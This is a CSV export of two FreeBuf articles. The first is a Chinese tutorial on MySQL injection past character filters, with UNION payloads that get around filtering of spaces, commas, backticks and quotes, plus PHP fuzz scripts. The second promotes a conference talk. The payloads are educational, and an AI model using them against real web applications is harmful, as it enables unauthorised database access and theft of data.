author,link,published,text,title
Zzzxbug,,2018-12-06,"*本文原创作者：Zzzxbug，本文属FreeBuf原创奖励计划，未经许可禁止转载对于mysql的注入，基本上是每一名web安全从业者入门的基本功，这里不多废话，结合本人无聊时在mysql上的测试，来谈一谈mysql在过滤某些特殊字符情况下的注入，因为是想到哪写到哪，文章比较散，各位大佬请绕过，和我一样的小白可以看一看，温故而知新，必有所获。php查询mysql的后台脚本就不搭了，没有多大意义，直接从mysql控制台开始测试。首先从最简单的开始：直接使用mysql系统库做测试：我们假设在user后存在注入点：那么在利用order by获得列数后进行union注入：我们假设在user后存在注入点：那么在利用order by获得列数后进行union注入：现在开始增加难度,假设后端代码过滤了空格，我们可以替换空格的方法很多：/**/，0x0a,0x0b,0x0c,0x0d:上图使用/**/替换空格上图使用0x0a号字符替换空格，注意:按住alt键+小键盘输入10再松开alt键即可在控制台中输入ascii字符0x0a上图使用0x0a号字符替换空格，注意:按住alt键+小键盘输入10再松开alt键即可在控制台中输入ascii字符0x0a上图使用0x0b号字符替换空格，注意:按住alt键+小键盘输入11再松开alt键即可在控制台中输入ascii字符0x0b上图使用0x0b号字符替换空格，注意:按住alt键+小键盘输入11再松开alt键即可在控制台中输入ascii字符0x0b上图使用0x0c号字符替换空格，注意:按住alt键+小键盘输入12再松开alt键即可在控制台中输入ascii字符0x0c上图使用0x0c号字符替换空格，注意:按住alt键+小键盘输入12再松开alt键即可在控制台中输入ascii字符0x0c上图使用0x0d号字符替换空格，注意:按住alt键+小键盘输入13再松开alt键即可在控制台中输入ascii字符0x0d,但因为在控制台中一旦输入0x0d，就会执行指令，所以这里只在union前输入了一次。上图使用0x0d号字符替换空格，注意:按住alt键+小键盘输入13再松开alt键即可在控制台中输入ascii字符0x0d,但因为在控制台中一旦输入0x0d，就会执行指令，所以这里只在union前输入了一次。做到这里我们可能会想，除了这些字符外还有没有其它字符可以替换空格呢，我们fuzz一下：&lt;?php$mysqli = new mysqli('localhost', 'root', '', 'mysql');if ($mysqli-&gt;connect_errno) {    die(""could not connect to the database:\n"" . $mysqli-&gt;connect_error);}$i=0;while($i++&lt;256){    $sql = ""select host,user from user where user='a'"".chr($i).""union"".chr($i).""select 1,2;"";    $res = $mysqli-&gt;query($sql);    if ($res) {        echo ""Ok!:$i:"".chr($i).""&lt;br&gt;"";    }    }$mysqli-&gt;close();?&gt;将以上代码存为1.php,放入apache中网页访问，显示结果：可以发现，除了我们刚刚使用的0x0a,0x0b,0x0c,0x0d外还有9号与160号字符可以替换空格（32号本身就是空格，35是注释符不能查询获得正确结果，9号是tab，刚刚漏了，至于160号字符为什么行，我也不知道，那位哥如果知道可以告诉大家)。可以发现，除了我们刚刚使用的0x0a,0x0b,0x0c,0x0d外还有9号与160号字符可以替换空格（32号本身就是空格，35是注释符不能查询获得正确结果，9号是tab，刚刚漏了，至于160号字符为什么行，我也不知道，那位哥如果知道可以告诉大家)。进一步思考：如果这些字符都被过滤了，有没有办法不依靠空格来注入呢，办法还是有的，看下面的语句：在这个语句中： 在这个语句中： select host,user from user where user='a'union(select`table_name`,`table_type`from`information_schema`.`tables`);利用了括号、反引号来隔离了sql关键词与库名表名列名，完成了注入。接下来继续提高难度，我们的注入语句中有许多逗号，看了让人不爽，如果把逗号也过滤掉，我们有没有办法注入呢，方法还是有的，我们可以结合join语句和子查询的别名来替换逗号，看下面的语句：在这个语句中，我们利用join与别名，成功的避免使用逗号实现了注入：在这个语句中，我们利用join与别名，成功的避免使用逗号实现了注入：select host,user from user where user='a'union(select*from((select`table_name`from`information_schema`.`tables`where`table_schema`='mysql')`a`join(select`table_type`from`information_schema`.`tables`where`table_schema`='mysql')b));玩到这里，我脑洞忽然大开：mysql的子查询别名是可以无限嵌套的么，像俄罗斯套娃一样，下面的语句可以无限扩展么，会不会出现溢出呢：为了验证，我又进行了一次fuzz，将下面的代码存为2.php，放入apache中网页访问：为了验证，我又进行了一次fuzz，将下面的代码存为2.php，放入apache中网页访问：&lt;?php$mysqli = new mysqli('localhost', 'root', '', 'mysql');if ($mysqli-&gt;connect_errno) {    die(""could not connect to the database:\n"" . $mysqli-&gt;connect_error);}$i=1;$sql = ""select'1'"";while($i++){    $alias='a'.""$i"";    $sql = ""select*from("".$sql."")$alias"";    $res = $mysqli-&gt;query($sql);    if(!$res){        echo $mysqli-&gt;error;        break;    }else{        echo $sql.""&lt;br&gt;"";    }}$mysqli-&gt;close();?&gt;结果如下：select*from(select'1')a2select*from(select*from(select'1')a2)a3select*from(select*from(select*from(select'1')a2)a3)a4select*from(select*from(select*from(select*from(select'1')a2)a3)a4)a5。。。。。。select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select*from(select'1')a2)a3)a4)a5)a6)a7)a8)a9)a10)a11)a12)a13)a14)a15)a16)a17)a18)a19)a20)a21)a22)a23)a24)a25)a26)a27)a28)a29)a30)a31)a32)a33)a34)a35)a36)a37)a38)a39)a40)a41)a42)a43)a44)a45)a46)a47)a48)a49)a50)a51)a52)a53)a54)a55)a56)a57)a58)a59)a60)a61)a62)a63)a64Too high level of nesting for select 可以看到在嵌套64次后，mysql输出了”Too high level of nesting for select”的错误信息，也就是说我们最多用mysql进行嵌套子查询64层。继续回到正题上，再来看刚刚的语句：select host,user from user where user='a'union(select*from((select`table_name`from`information_schema`.`tables`where`table_schema`='mysql')`a`join(select`table_type`from`information_schema`.`tables`where`table_schema`='mysql')b));在库名、表名、列名不带空格、*、{、}等特殊符号的情况下（我猜想反引号的存在本来就是为了这类特殊库名表名列名准备的），语句中的反引号也可以用括号代替，变成下面的语句，这样即使过滤了反引号也可以实现注入：select host,user from user where user='a'union(select*from(((select(table_name)from(information_schema.tables)where(table_schema)='mysql')a)join(select(table_type)from(information_schema.tables)where(table_schema)='mysql')b));如果存在宽字节注入，那么即使过滤了单引号，我们也可以注入，这时语句变成这样：select host,user from user where user='a?'union(select*from(((select(table_name)from(information_schema.tables)where(table_schema)=0x6D7973716C)a)join(select(table_type)from(information_schema.tables)where(table_schema)=0x6D7973716C)b));在注入点处使用宽字节绕过\,将后面的数据处替换成十六进制，来避免了单引号。其他技巧：某些web应用只取查询结果的第一行，这时可以使用group_concat()来获取完整数据,例如：select host,user from user where user='a?'union(select*from(((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=0x6D7973716C)a)join(select(table_type)from(information_schema.tables)where(table_schema)=0x6D7973716C)b));也可以多加几个条件判断来逐行获取所要的数据：select host,user from user where user='a?'union(select*from(((select(table_name)from(information_schema.tables)where(table_schema)=(0x6D7973716C)and(table_name)!=(0x6462)and(table_name)!=(0x67687478).......)a)join(select(0x77)from(information_schema.tables)where(table_schema)=0x6D7973716C)b));*本文原创作者：Zzzxbug，本文属FreeBuf原创奖励计划，未经许可禁止转载",SQL注入测试技巧TIP：再从Mysql注入绕过过滤说起
FB客服,,2018-12-04,安全防护与攻击是一对矛盾体，几乎同时出现，一起发展，但安全防护总是滞后于攻击手段。近年来，网络攻击行为呈现以下趋势：攻击成本降低，攻击技术复杂化，攻击方式多样化。同时，攻击产业链日趋成熟，攻击行为危害更大，防护难度更高，尤其是针对企业的攻击活动大有从个人行为转变为有组织、有预谋的网络犯罪团的趋势。随着“互联网+”和“工业4.0”等国家战略的全面铺开，大大推动了企业的数字化转型。在这个过程中，应接不暇的网络攻击手段给企业安全运营造成了重大挑战，传统安全设备和安全解决方案在对抗各类不对等攻击，如APT、数据窃取、勒索软件、社会工程学攻击等更是见效甚微。此外，随着基于人工智能技术构建的攻击模型不断投入到针对企业的恶意网络活动中，一些恶意软件也可以通过机器学习技术来对抗安全软件，如此一来大大扩展了攻击链、提高了攻击效率。在这样的新时代背景下，针对企业的网络攻击面不断扩大，从数字化领域逐渐扩展到物理世界，将对企业的运营、业务、生产、产品和客户等产生更广泛、更深远的影响。要对抗APT等复杂攻击手段和人工智能技术武装下的攻击模型，需要通过使用类似于人工智能等新兴技术来不断提升防御技术的能力。但是对于企业尤其是中小企业的网络安全建设者来说，一方面普遍存在网络安全管理人才储备缺失、技术力量薄弱、防护手段单一等条件限制问题 ，另一方面又困惑于如何在有效抵御新型网络威胁时保证ROI，提升投入产出比。面对网络安全建设对于企业运营的掣肘时，企业该如何实现安全能力创新、解决安全痛点，通过安全赋能业务？FIT 2019组委会充分利用优势资源，特邀斗象科技高级技术安全总监张志鹏带来《智慧运营-纵深监测与响应》的议题分享，从企业安全纵深监测与响应的视角出发，结合大数据分析、机器学习等技术，通过对应用数据的可视计算，提出安全解决方案，帮助企业构建安全智慧运营。张志鹏，斗象科技安全研究专家，曾在华为任职高级安全工程师，有多年安全测试、安全渗透及安全解决方案设计工作经验，擅长安全体系建设、安全风险评估、产品安全流程管理、项目管理等方向，目前负责斗象旗下所有品牌产品质量和行业安全研究工作。编写过金融行业安全态势报告、移动App安全报告、企业安全威胁统一应对指南等报告。熟练掌握web安全、逆向工程、安全建模分析、源码审计等技术。FIT 2019互联网安全创新大会FreeBuf互联网安全创新大会（FIT）是由国内领先的互联网安全新媒体平台FreeBuf.COM主办的年度互联网安全盛会，WitAwards互联网安全颁奖盛典也将同期举行。 FIT 2019大会会期为2018年12月12日～13日，会议将在上海宝华万豪酒店举行。本次大会主论坛议程聚焦「全球高峰会」、「前沿安全神盾局」、「WitAwards颁奖盛典」、「WIT安全创新者联盟」「X-TECH技术派对」、「HACK DEMO」六大板块，独立分设「白帽LIVE」及 「企业安全俱乐部」两大分论坛，与来自全球的安全从业者、优秀技术专家、企业安全建设者、白帽安全专家、研究机构等共同展开演讲与探讨。同时「中国首席信息安全官高峰论坛」、「漏洞马拉松线下邀请赛」也将在特色分会场同期举行。此次盛会致力于分享2018年度安全行业创新硕果，共同探索与展望未来安全新边界。&gt;&gt;&gt;【FIT 2019官网】,FIT 2019议题前瞻：智慧运营-纵深监测与响应丨CSO高峰论坛
